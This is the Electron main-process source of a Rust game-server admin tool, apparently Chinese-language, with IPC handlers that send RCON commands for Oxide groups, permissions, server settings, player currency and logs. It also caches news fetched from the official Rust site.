        const id = t.match(/^([\w.-]+)/i);
        if (id) collected.push(id[1]);
      });
    }
    if (collected.length) return dedupe(collected);
  }

  const lines = text.split('\n').map((l) => l.trim()).filter(Boolean);
  const noise = /^(Calling|Error|Syntax|Unknown|Invalid|You\s|Plugin|Listing|There\s|Please\s|\[)/i;
  const out = [];
  for (const line of lines) {
    if (noise.test(line)) continue;
    if (/^Groups?\s*:?\s*$/i.test(line)) continue;
    const afterBullet = line.replace(/^[\s>*•]+/, '').replace(/^\d+[\.)]\s*/, '').trim();
    if (/^[\w.-]+$/i.test(afterBullet) && afterBullet.length <= 64) out.push(afterBullet);
  }
  const fromLines = dedupe(out);
  if (fromLines.length) return fromLines;

  const named = new Set();
  let m;
  const reG = /\bGroup\s+['"]([^'"]+)['"]/gi;
  while ((m = reG.exec(text)) !== null) named.add(m[1]);
  return named.size ? [...named] : [];
}

async function fetchOxideGroupsList() {
  const commands = ['oxide.show groups', 'o.show groups', 'perm.show groups', 'oxide.groups'];
  let lastRaw = '';
  let lastTimeout = false;
  for (const cmd of commands) {
    const r = await sendRconCommand(cmd, 20000);
    lastRaw = r.message != null ? String(r.message) : '';
    if (r.timeout) lastTimeout = true;
    const groups = parseGroupsFromRconOutput(lastRaw);
    if (groups.length) return { ok: true, groups, raw: lastRaw, command: cmd };
  }
  return {
    ok: true,
    groups: [],
    raw: lastRaw,
    command: commands[commands.length - 1],
    timedOut: lastTimeout
  };
}

ipcMain.handle('get-groups', async () => {
  try {
    return await fetchOxideGroupsList();
  } catch (e) {
    return { ok: false, groups: [], raw: '', error: e.message };
  }
});

function parsePermListFromOutput(raw) {
  const text = String(raw || '').replace(/\r\n/g, '\n').replace(/\r/g, '\n');
  if (!text.trim()) return [];
  const out = [];

  // 常见权限形态：plugin.permission 或 oxide.xxx
  const re = /\b[a-z0-9][a-z0-9_.:-]{2,}\b/gi;
  let m;
  while ((m = re.exec(text)) !== null) {
    const v = m[0];
    if (!v.includes('.')) continue;
    if (v.length > 80) continue;
    if (/^(steam|http|https|ws|wss)\b/i.test(v)) continue;
    out.push(v);
  }

  return [...new Set(out.map((s) => s.toLowerCase()))].sort();
}

async function fetchOxidePermissionsList() {
  const commands = ['oxide.show perms', 'o.show perms', 'perm.show perms', 'oxide.permissions', 'perm.show'];
  let lastRaw = '';
  let lastTimeout = false;
  for (const cmd of commands) {
    const r = await sendRconCommand(cmd, 20000);
    lastRaw = r.message != null ? String(r.message) : '';
    if (r.timeout) lastTimeout = true;
    const perms = parsePermListFromOutput(lastRaw);
    if (perms.length) return { ok: true, perms, raw: lastRaw, command: cmd };
  }
  return { ok: true, perms: [], raw: lastRaw, command: commands[commands.length - 1], timedOut: lastTimeout };
}

ipcMain.handle('get-permissions', async () => {
  try {
    return await fetchOxidePermissionsList();
  } catch (e) {
    return { ok: false, perms: [], raw: '', error: e.message };
  }
});

function parseGroupDetail(raw) {
  const text = String(raw || '').replace(/\r\n/g, '\n').replace(/\r/g, '\n');
  const perms = parsePermListFromOutput(text);

  // 成员：尽量从输出里找 SteamID（17位）
  const users = [];
  const reSid = /\b\d{17}\b/g;
  let m;
  while ((m = reSid.exec(text)) !== null) users.push(m[0]);
  const uniqUsers = [...new Set(users)];

  return { perms, users: uniqUsers, raw: text };
}

ipcMain.handle('get-group-detail', async (event, group) => {
  const g = String(group || '').trim();
  if (!g) return { ok: false, perms: [], users: [], raw: '', error: 'group required' };
  try {
    const commands = [`oxide.show group ${g}`, `o.show group ${g}`, `perm.show group ${g}`];
    let lastRaw = '';
    let lastTimeout = false;
    for (const cmd of commands) {
      const r = await sendRconCommand(cmd, 20000);
      lastRaw = r.message != null ? String(r.message) : '';
      if (r.timeout) lastTimeout = true;
      const parsed = parseGroupDetail(lastRaw);
      // 即使解析不到 perms/users，也把 raw 返回给前端展示错误/提示
      return { ok: true, group: g, ...parsed, command: cmd, timedOut: lastTimeout };
    }
    return { ok: true, group: g, perms: [], users: [], raw: lastRaw, command: commands[commands.length - 1], timedOut: lastTimeout };
  } catch (e) {
    return { ok: false, group: g, perms: [], users: [], raw: '', error: e.message };
  }
});

ipcMain.handle('group-grant-perm', async (event, group, perm) => {
  const g = String(group || '').trim();
  const p = String(perm || '').trim();
  if (!g || !p) return { ok: false, error: 'group/perm required' };
  try {
    const r = await sendRconCommand(`oxide.grant group ${g} ${p}`, 20000);
    return { ok: true, message: r.message, timeout: !!r.timeout };
  } catch (e) {
    return { ok: false, error: e.message };
  }
});

ipcMain.handle('group-revoke-perm', async (event, group, perm) => {
  const g = String(group || '').trim();
  const p = String(perm || '').trim();
  if (!g || !p) return { ok: false, error: 'group/perm required' };
  try {
    const r = await sendRconCommand(`oxide.revoke group ${g} ${p}`, 20000);
    return { ok: true, message: r.message, timeout: !!r.timeout };
  } catch (e) {
    return { ok: false, error: e.message };
  }
});

// ===== 所有插件 =====
ipcMain.handle('get-plugins', async () => {
  try {
    const r = await sendRconCommand('oxide.plugins');
    const lines = (r.message || '').split('\n').filter(l => l.trim());
    const plugins = [];
    lines.forEach(line => {
      const m = line.match(/^\s*\d+\s+(.+?)\s+\(([^)]+)\)\s+by\s+(.+)$/);
      if (m) {
        plugins.push({ Name: m[1].trim(), Version: m[2].trim(), Author: m[3].trim() });
      }
    });
    return { ok: true, plugins, raw: r.message };
  } catch (e) { return { ok: false, plugins: [], error: e.message }; }
});

// ===== 离线玩家 =====
const offlineFile = path.join(dataDir, 'RustAdmin', 'offline_players.json');
ipcMain.handle('get-offline-players', () => {
  if (!fs.existsSync(offlineFile)) return { players: [] };
  try { return { players: JSON.parse(fs.readFileSync(offlineFile, 'utf8')) }; }
  catch { return { players: [] }; }
});

ipcMain.handle('clear-offline-players', () => {
  try {
    fs.writeFileSync(offlineFile, JSON.stringify([], null, 2));
    return { ok: true };
  } catch (e) {
    return { ok: false, error: e.message };
  }
});

function recordOfflinePlayer(player) {
  let players = [];
  if (fs.existsSync(offlineFile)) {
    try { players = JSON.parse(fs.readFileSync(offlineFile, 'utf8')); } catch {}
  }
  const idx = players.findIndex(p => p.SteamID === player.SteamID);
  const record = { ...player, OfflineTime: new Date().toISOString() };
  if (idx >= 0) players[idx] = record; else players.unshift(record);
  if (players.length > 500) players = players.slice(0, 500);
  fs.writeFileSync(offlineFile, JSON.stringify(players, null, 2));
}

// ===== 服务器配置 =====
ipcMain.handle('server-set-hostname', async (event, name) => {
  logUsage('server_config', { action: 'set_hostname', value: name });
  try { const r = await sendRconCommand(`server.hostname "${name}"`); return { ok: true, message: r.message }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('server-set-weather', async (event, weather) => {
  logUsage('server_config', { action: 'set_weather', value: weather });
  // Weather 2.0：优先使用 weather.load / weather.reset（更稳定、更符合官方文档）
  // 可用类型：Clear Dust Fog Overcast RainHeavy RainMild Storm
  const map = {
    clear: 'weather.load Clear',
    cloudy: 'weather.load Overcast',
    wind: 'weather.wind 1',
    fog: 'weather.load Fog',
    storm: 'weather.load Storm',
    default: 'weather.reset'
  };
  try {
    const plan = String(map[weather] || `weather.${weather}`);
    // RCON 不一定支持在一条命令里用 ; 执行多条，这里拆分逐条发送
    const cmds = plan.split(';').map((s) => s.trim()).filter(Boolean);
    for (const cmd of cmds) {
      await sendRconCommand(cmd, 20000);
    }
    return { ok: true };
  }
  catch (e) { return { ok: false, error: e.message }; }
});

ipcMain.handle('server-save', async () => {
  logUsage('server_config', { action: 'server_save' });
  try { const r = await sendRconCommand('server.save', 20000); return { ok: true, message: r.message, timeout: !!r.timeout }; }
  catch (e) { return { ok: false, error: e.message }; }
});

ipcMain.handle('server-writecfg', async () => {
  logUsage('server_config', { action: 'server_writecfg' });
  try { const r = await sendRconCommand('server.writecfg', 20000); return { ok: true, message: r.message, timeout: !!r.timeout }; }
  catch (e) { return { ok: false, error: e.message }; }
});

ipcMain.handle('server-status', async () => {
  logUsage('server_config', { action: 'server_status' });
  try { const r = await sendRconCommand('status', 20000); return { ok: true, message: r.message, timeout: !!r.timeout }; }
  catch (e) { return { ok: false, error: e.message }; }
});

ipcMain.handle('server-info', async () => {
  logUsage('server_config', { action: 'server_info' });
  try { const r = await sendRconCommand('server.info', 20000); return { ok: true, message: r.message, timeout: !!r.timeout }; }
  catch (e) { return { ok: false, error: e.message }; }
});

function parseConvarValue(raw, name) {
  const s = String(raw || '').trim();
  if (!s) return '';
  // 常见输出：server.hostname: "xxx" / server.hostname "xxx" / server.hostname = "xxx"
  const re = new RegExp('^' + name.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&') + '\\\\s*[:=]?\\\\s*', 'i');
  let v = s.replace(re, '').trim();
  v = v.replace(/^"+|"+$/g, '').trim();
  return v;
}

ipcMain.handle('server-get-convars', async (event, names) => {
  const list = Array.isArray(names) ? names : [];
  const unique = [...new Set(list.map((x) => String(x || '').trim()).filter(Boolean))].slice(0, 40);
  const out = {};
  try {
    for (const n of unique) {
      const r = await sendRconCommand(n, 15000);
      out[n] = parseConvarValue(r.message, n);
    }
    return { ok: true, values: out };
  } catch (e) {
    return { ok: false, values: out, error: e.message };
  }
});

ipcMain.handle('server-set-convar', async (event, name, value) => {
  const n = String(name || '').trim();
  if (!n) return { ok: false, error: 'name required' };
  const v = value == null ? '' : String(value);
  logUsage('server_config', { action: 'set_convar', name: n });
  try {
    // 字符串用引号，数字/布尔直接传也可；这里统一加引号更稳妥
    const r = await sendRconCommand(`${n} "${v.replace(/"/g, '\\"')}"`, 20000);
    return { ok: true, message: r.message, timeout: !!r.timeout };
  } catch (e) {
    return { ok: false, error: e.message };
  }
});
ipcMain.handle('server-set-time', async (event, time) => {
  logUsage('server_config', { action: 'set_time', value: time });
  try { const r = await sendRconCommand(`env.time ${time}`); return { ok: true }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('server-set-maxplayers', async (event, n) => {
  logUsage('server_config', { action: 'set_maxplayers', value: n });
  try { const r = await sendRconCommand(`server.maxplayers ${n}`); return { ok: true }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('server-npc-enabled', async (event, enabled) => {
  logUsage('server_config', { action: 'set_npc', value: enabled });
  try { const r = await sendRconCommand(`global.npc_enabled ${enabled ? 'true' : 'false'}`); return { ok: true }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('server-gather-rate', async (event, type, val) => {
  logUsage('server_config', { action: 'gather_rate', type, value: val });
  try { const r = await sendRconCommand(`gather.rate resource "${type}" ${val}`); return { ok: true }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('server-team-limit', async (event, n) => {
  logUsage('server_config', { action: 'set_team_limit', value: n });
  try { const r = await sendRconCommand(`server.maxteamsize ${n}`); return { ok: true }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('server-combat-log', async (event, interval) => {
  logUsage('server_config', { action: 'combat_log', value: interval });
  try { const r = await sendRconCommand(`server.combatlogsize ${interval}`); return { ok: true }; }
  catch (e) { return { ok: false, error: e.message }; }
});

// ===== 玩家授权 =====
ipcMain.handle('player-grant', async (event, permission, steamid) => {
  logUsage('player_permission', { action: 'grant_user', permission, steamid });
  try { const r = await sendRconCommand(`oxide.grant user ${steamid} ${permission}`); return { ok: true, message: r.message }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('player-revoke', async (event, permission, steamid) => {
  logUsage('player_permission', { action: 'revoke_user', permission, steamid });
  try { const r = await sendRconCommand(`oxide.revoke user ${steamid} ${permission}`); return { ok: true, message: r.message }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('player-grant-all', async (event, permission) => {
  logUsage('player_permission', { action: 'grant_all', permission });
  try { const r = await sendRconCommand(`oxide.grant group default ${permission}`); return { ok: true, message: r.message }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('player-revoke-all', async (event, permission) => {
  logUsage('player_permission', { action: 'revoke_all', permission });
  try { const r = await sendRconCommand(`oxide.revoke group default ${permission}`); return { ok: true, message: r.message }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('player-add-group', async (event, steamid, group) => {
  logUsage('player_permission', { action: 'add_group', group, steamid });
  try { const r = await sendRconCommand(`oxide.usergroup add ${steamid} ${group}`); return { ok: true, message: r.message }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('player-remove-group', async (event, steamid, group) => {
  logUsage('player_permission', { action: 'remove_group', group, steamid });
  try { const r = await sendRconCommand(`oxide.usergroup remove ${steamid} ${group}`); return { ok: true, message: r.message }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('player-give-currency', async (event, steamid, amount) => {
  logUsage('player_economy', { action: 'give_currency', steamid, amount });
  try { const r = await sendRconCommand(`economics.deposit ${steamid} ${amount}`); return { ok: true, message: r.message }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('player-deduct-currency', async (event, steamid, amount) => {
  logUsage('player_economy', { action: 'deduct_currency', steamid, amount });
  try { const r = await sendRconCommand(`economics.withdraw ${steamid} ${amount}`); return { ok: true, message: r.message }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('player-give-points', async (event, steamid, amount) => {
  logUsage('player_economy', { action: 'give_points', steamid, amount });
  try { const r = await sendRconCommand(`sr add ${steamid} ${amount}`); return { ok: true, message: r.message }; }
  catch (e) { return { ok: false, error: e.message }; }
});
ipcMain.handle('player-deduct-points', async (event, steamid, amount) => {
  logUsage('player_economy', { action: 'deduct_points', steamid, amount });
  try { const r = await sendRconCommand(`sr remove ${steamid} ${amount}`); return { ok: true, message: r.message }; }
  catch (e) { return { ok: false, error: e.message }; }
});

// ===== 日志 =====
ipcMain.handle('get-logs', () => {
  if (!fs.existsSync(logsDir)) return [];
  return fs.readdirSync(logsDir).filter(f => f.endsWith('.txt')).sort().reverse()
    .map(f => ({ name: f, path: path.join(logsDir, f) }));
});
ipcMain.handle('read-log', (event, filePath) => {
  if (!fs.existsSync(filePath)) return '';
  return fs.readFileSync(filePath, 'utf8');
});
ipcMain.handle('open-logs-folder', () => shell.openPath(logsDir));
ipcMain.handle('save-console-log-local', (event, text) => {
  try {
    if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
    const file = path.join(logsDir, `manual_console_${Date.now()}.txt`);
    fs.writeFileSync(file, String(text || ''), 'utf8');
    shell.showItemInFolder(file);
    return { ok: true, path: file };
  } catch (e) {
    return { ok: false, error: e.message };
  }
});

// ===== 自定义命令 =====
ipcMain.handle('get-custom-commands', () => {
  if (!fs.existsSync(customCmdsFile)) return [];
  try { return JSON.parse(fs.readFileSync(customCmdsFile, 'utf8')); } catch { return []; }
});
ipcMain.handle('save-custom-commands', (event, cmds) => {
  fs.writeFileSync(customCmdsFile, JSON.stringify(cmds, null, 2));
  return true;
});

// ===== 外部链接 =====
ipcMain.on('open-url', (event, url) => shell.openExternal(url));

// ===== 窗口控制 =====
ipcMain.on('window-minimize', () => mainWindow?.minimize());
ipcMain.on('window-maximize', () => {
  if (mainWindow?.isMaximized()) mainWindow.unmaximize();
  else mainWindow?.maximize();
});
ipcMain.on('window-close', () => {
  logUsage('app_closed', {});
  mainWindow?.close();
});

// ===== Rust 新闻自动获取 =====
const newsCacheFile = path.join(dataDir, 'RustAdmin', 'rust_news_cache.json');
const NEWS_CACHE_TTL = 30 * 60 * 1000; // 30分钟缓存

function fetchRustNews() {
  return new Promise((resolve) => {
    try {
      const cached = loadNewsCache();
      if (cached && Date.now() - cached.fetchTime < NEWS_CACHE_TTL) {
        resolve(cached.news);
        return;
      }
      const req = https.get('https://rust.facepunch.com/news/', { headers: { 'User-Agent': 'Mozilla/5.0' }, timeout: 8000 }, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            const news = parseRustNews(data);
            saveNewsCache(news);
            resolve(news);
          } catch { resolve(getDefaultNews()); }
        });
      });
      req.on('error', () => resolve(getDefaultNews()));
      req.setTimeout(8000, () => { req.destroy(); resolve(getDefaultNews()); });
    } catch { resolve(getDefaultNews()); }
  });
}

function parseRustNews(html) {
  const news = [];
  const regex = /<a href="\/news\/([^"]+)"[^>]*>\s*<article[^>]*>[\s\S]*?<span[^>]*class="[^"]*tag[^"]*"[^>]*>([^<]+)<\/span>[\s\S]*?<h2[^>]*>([^<]+)<\/h2>[\s\S]*?<p[^>]*>([^<]+)<\/p>/g;
  let m;
  while ((m = regex.exec(html)) !== null && news.length < 5) {
    news.push({ tag: m[2].trim(), title: m[3].trim().replace(/<[^>]+>/g, ''), desc: m[4].trim().replace(/<[^>]+>/g, '') });
  }
  return news.length ? news : getDefaultNews();
}

function getDefaultNews() {
  return [
    { tag: '大更新', zh: 'Spring Clean 更新 — 新增装甲梯舱盖(Armored Ladder Hatch)与水轮(Water Wheel)，大量生活质量改进、错误修复与性能优化' },
    { tag: 'DevBlog', zh: 'Shipshape 更新 — 水上及深海居住、建造、战斗全面改进，延长白天时间' },
    { tag: 'DLC', zh: 'Box DLC 上线 — 深海船只改动，船载电气部署，更多新内容' },
    { tag: '大型DLC', zh: 'Naval Update 正式上线 — 可建造船只、深海探索、热带岛屿、幽灵船、改进版AI' },
    { tag: '节日', zh: '农历新年2026 — 马面具、马甲等马年纪念道具上线' },
    { tag: '社区', zh: '社区更新268 — 海军测试、Twitch Drops、圣诞节活动回顾' },
    { tag: '周年庆', zh: 'Rust 十二周年庆典 — 游戏持续保持强劲增长势头' },
  ];
}

function loadNewsCache() {
  if (!fs.existsSync(newsCacheFile)) return null;
  try { return JSON.parse(fs.readFileSync(newsCacheFile, 'utf8')); } catch { return null; }
}

function saveNewsCache(news) {
  try { fs.writeFileSync(newsCacheFile, JSON.stringify({ news, fetchTime: Date.now() }, null, 2)); } catch {}
}

ipcMain.handle('get-rust-news', async () => {
  const news = await fetchRustNews();
  return news;
});
